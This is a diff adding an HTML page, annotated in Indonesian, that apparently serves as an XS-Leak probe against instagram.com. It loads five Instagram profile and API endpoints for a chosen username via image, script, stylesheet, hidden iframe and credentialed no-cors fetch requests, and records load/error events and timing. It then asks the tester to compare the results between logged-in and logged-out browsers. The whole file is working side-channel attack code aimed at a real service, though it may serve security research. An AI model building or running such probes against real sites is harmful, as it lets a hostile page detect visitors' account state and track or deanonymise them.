@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<title>B3 XS-Leak probe — instagram.com login-state (test accounts only)</title>
+<style>
+  body { font-family: monospace; margin: 20px; background: #111; color: #ddd; }
+  table { border-collapse: collapse; width: 100%; }
+  th, td { border: 1px solid #555; padding: 6px; text-align: left; font-size: 13px; }
+  th { background: #222; }
+  .diff { background: #3a2b00; }
+  h1 { font-size: 18px; }
+  p { font-size: 13px; color: #aaa; }
+</style>
+</head>
+<body>
+<h1>B3 — instagram.com login-state probe (test only)</h1>
+<p>Target username: <b id="uname">?</b> — ubah dengan <code>?u=&lt;username&gt;</code>.
+Jalankan halaman ini 3x: (1) Chrome login IG, (2) Incognito (logout), (3) profil bersih.
+Screenshot tabel tiap kondisi. Sinyal yang dicari: baris yang BERBEDA antara kondisi login vs logout.</p>
+<table id="results">
+  <tr><th>Endpoint</th><th>Probe</th><th>Event</th><th>ms</th><th>Detail</th></tr>
+</table>
+<pre id="log"></pre>
+<script>
+(function () {
+  var params = new URLSearchParams(location.search);
+  var u = params.get('u') || 'parezz321';
+  document.getElementById('uname').textContent = u;
+  var table = document.getElementById('results');
+  var logEl = document.getElementById('log');
+  var rows = {};
+  function log(msg) { logEl.textContent += msg + '\n'; console.log('[B3] ' + msg); }
+  function addRow(endpoint, probe) {
+    var tr = document.createElement('tr');
+    tr.innerHTML = '<td>' + endpoint + '</td><td>' + probe + '</td><td class="ev">pending</td><td class="ms">-</td><td class="dt">-</td>';
+    table.appendChild(tr);
+    var key = endpoint + '|' + probe;
+    rows[key] = tr;
+    return tr;
+  }
+  function finish(endpoint, probe, ev, ms, detail) {
+    var tr = rows[endpoint + '|' + probe];
+    if (!tr) return;
+    tr.querySelector('.ev').textContent = ev;
+    tr.querySelector('.ms').textContent = ms;
+    tr.querySelector('.dt').textContent = detail || '';
+    log(endpoint + ' [' + probe + '] ' + ev + ' ' + ms + 'ms ' + (detail || ''));
+  }
+  var endpoints = [
+    'https://www.instagram.com/' + u + '/',
+    'https://www.instagram.com/' + u + '/embed/',
+    'https://i.instagram.com/api/v1/users/web_profile_info/?username=' + u,
+    'https://www.instagram.com/accounts/login/',
+    'https://www.instagram.com/' + u + '/?__a=1'
+  ];
+  endpoints.forEach(function (url) {
+    // <img> probe
+    (function () {
+      var t0 = performance.now();
+      addRow(url, 'img');
+      var im = new Image();
+      im.onload = function () { finish(url, 'img', 'load', Math.round(performance.now() - t0), im.naturalWidth + 'x' + im.naturalHeight); };
+      im.onerror = function () { finish(url, 'img', 'error', Math.round(performance.now() - t0), ''); };
+      setTimeout(function () { var tr = rows[url + '|img']; if (tr && tr.querySelector('.ev').textContent === 'pending') finish(url, 'img', 'timeout', Math.round(performance.now() - t0), ''); }, 15000);
+      im.src = url + (url.indexOf('?') === -1 ? '?' : '&') + 'cb=' + Date.now();
+    })();
+    // <script> probe
+    (function () {
+      var t0 = performance.now();
+      addRow(url, 'script');
+      var s = document.createElement('script');
+      s.onload = function () { finish(url, 'script', 'load', Math.round(performance.now() - t0), ''); };
+      s.onerror = function () { finish(url, 'script', 'error', Math.round(performance.now() - t0), ''); };
+      setTimeout(function () { var tr = rows[url + '|script']; if (tr && tr.querySelector('.ev').textContent === 'pending') finish(url, 'script', 'timeout', Math.round(performance.now() - t0), ''); }, 15000);
+      s.src = url + (url.indexOf('?') === -1 ? '?' : '&') + 'cb=' + Date.now();
+      document.head.appendChild(s);
+    })();
+    // <link stylesheet> probe
+    (function () {
+      var t0 = performance.now();
+      addRow(url, 'link-css');
+      var l = document.createElement('link');
+      l.rel = 'stylesheet';
+      l.onload = function () { finish(url, 'link-css', 'load', Math.round(performance.now() - t0), ''); };
+      l.onerror = function () { finish(url, 'link-css', 'error', Math.round(performance.now() - t0), ''); };
+      setTimeout(function () { var tr = rows[url + '|link-css']; if (tr && tr.querySelector('.ev').textContent === 'pending') finish(url, 'link-css', 'timeout', Math.round(performance.now() - t0), ''); }, 15000);
+      l.href = url + (url.indexOf('?') === -1 ? '?' : '&') + 'cb=' + Date.now();
+      document.head.appendChild(l);
+    })();
+    // <iframe> probe
+    (function () {
+      var t0 = performance.now();
+      addRow(url, 'iframe');
+      var f = document.createElement('iframe');
+      f.style.display = 'none';
+      f.onload = function () { finish(url, 'iframe', 'load', Math.round(performance.now() - t0), ''); };
+      f.onerror = function () { finish(url, 'iframe', 'error', Math.round(performance.now() - t0), ''); };
+      setTimeout(function () { var tr = rows[url + '|iframe']; if (tr && tr.querySelector('.ev').textContent === 'pending') finish(url, 'iframe', 'timeout', Math.round(performance.now() - t0), ''); }, 15000);
+      f.src = url + (url.indexOf('?') === -1 ? '?' : '&') + 'cb=' + Date.now();
+      document.body.appendChild(f);
+    })();
+    // fetch no-cors + timing probe
+    (function () {
+      var t0 = performance.now();
+      addRow(url, 'fetch');
+      fetch(url + (url.indexOf('?') === -1 ? '?' : '&') + 'cb=' + Date.now(), { mode: 'no-cors', credentials: 'include', redirect: 'follow' })
+        .then(function (r) { finish(url, 'fetch', 'resolved type=' + r.type, Math.round(performance.now() - t0), ''); })
+        .catch(function (e) { finish(url, 'fetch', 'rejected', Math.round(performance.now() - t0), String(e).slice(0, 80)); });
+      setTimeout(function () { var tr = rows[url + '|fetch']; if (tr && tr.querySelector('.ev').textContent === 'pending') finish(url, 'fetch', 'timeout', Math.round(performance.now() - t0), ''); }, 15000);
+    })();
+  });
+  log('Probing ' + endpoints.length + ' endpoints x 5 methods for u=' + u);
+  log('Done marker: all rows leave "pending" (~15s).');
+})();
+</script>
+</body>
+</html>
